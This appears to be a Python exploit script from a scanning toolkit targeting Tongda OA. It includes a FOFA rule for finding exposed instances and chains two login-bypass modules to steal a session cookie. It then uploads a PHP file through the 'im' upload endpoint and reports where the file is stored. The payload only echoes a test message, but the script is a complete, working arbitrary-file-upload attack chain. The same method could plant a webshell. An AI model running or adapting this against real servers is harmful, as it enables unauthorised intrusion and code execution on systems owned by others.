#!/usr/bin/env python3
# _*_ coding:utf-8 _*_

import requests
import re
import requests.packages.urllib3
import io
from Config.config_requests import ua
from Moudle.TDXK.TDXK_Any_user_login import poc as poc1
from Moudle.TDXK.TDXK_online_user_login import poc as poc2
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


# 脚本信息
######################################################
NAME='TDXK_logined any file upload'
AUTHOR="境心"
REMARK='TDXK_登录后任意文件上传'
FOFA_RULE='app="TDXK-通达OA"'
######################################################

def poc_content():
    content = """-----------------------------340010984629733334144172362322
Content-Disposition: form-data; name="id"

WU_FILE_0
-----------------------------340010984629733334144172362322
Content-Disposition: form-data; name="name"

test.php
-----------------------------340010984629733334144172362322
Content-Disposition: form-data; name="type"

application/octet-stream
-----------------------------340010984629733334144172362322
Content-Disposition: form-data; name="lastModifiedDate"

2021/8/25 下午2:58:14
-----------------------------340010984629733334144172362322
Content-Disposition: form-data; name="size"

31
-----------------------------340010984629733334144172362322
Content-Disposition: form-data; name="file"; filename="test.php."
Content-Type: application/octet-stream

<?php
echo "this is a friendly test, Please check and repair upload vulnerabilities."
?>
-----------------------------340010984629733334144172362322--"""
    mem_string = io.StringIO()
    mem_string.write(content)
    mem_string.seek(0)
    return mem_string

def get_cookie(target):
    result1 = poc1(target)
    if result1['cookie']:
        cookie = result1['cookie']
    else:
        result2 = poc2(target)
        if result2['cookie']:
            cookie = result2['cookie']
    return cookie


def poc(target,cookie=None):
    result = {}
    mem_string = poc_content()
    upload_url = target+"/module/upload/upload.php?module=im"
    target_tmp_file = [('file', ('test.php', mem_string.read(), 'image/jpeg'))]
    if cookie != None:
        cookie = cookie
        headers = {
            "User-Agent": ua,
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "multipart/form-data; boundary=---------------------------340010984629733334144172362322",
            "Cookie": cookie,
            "Connection": "close"
        }
        target_res = requests.post(upload_url, headers=headers, files=target_tmp_file, verify=False, timeout=5)
        res_text = target_res.text
        if "test.php" in res_text and "SUCCESS" in res_text:
            target_tmp_path = re.findall('@(\d+)_', str(res_text))[0]
            target_tmp_filename = re.findall('@\d+_(\d+)', str(res_text))[0]
            target_filename = target_tmp_filename + '.test.php'
            print("文件位置: 未知上层目录/im/" + target_tmp_path + "/"+target_filename)
    elif cookie == None:
        cookie = get_cookie(target)
        headers = {
            "User-Agent": ua,
            "Accept-Encoding": "gzip, deflate",
            "Content-Type": "multipart/form-data; boundary=---------------------------340010984629733334144172362322",
            "Cookie": cookie,
            "Connection": "close"
        }
        target_res = requests.post(upload_url, headers=headers, files=target_tmp_file, verify=False, timeout=5)
        res_text = target_res.text
        if "test.php" in res_text and "SUCCESS" in res_text:
            target_tmp_path = re.findall('@(\d+)_', str(res_text))[0]
            target_tmp_filename = re.findall('@\d+_(\d+)', str(res_text))[0]
            target_filename = target_tmp_filename+'.test.php'
            result['文件位置'] = "未知上层目录/im/"+target_tmp_path+"/"+target_filename
            result['poc'] = NAME
            result['message'] = '存在登录后任意文件上传漏洞'
            return result

if __name__ == '__main__':
    # 结合任意登录漏洞盲测
    poc("http://127.0.0.1")
    # 盲测无结果，但能获取到账号的情况下，精准测试
    # poc("http://127.0.0.1","PHPSESSID=tbd8hi89eqtbeadt29rmort167; path=/")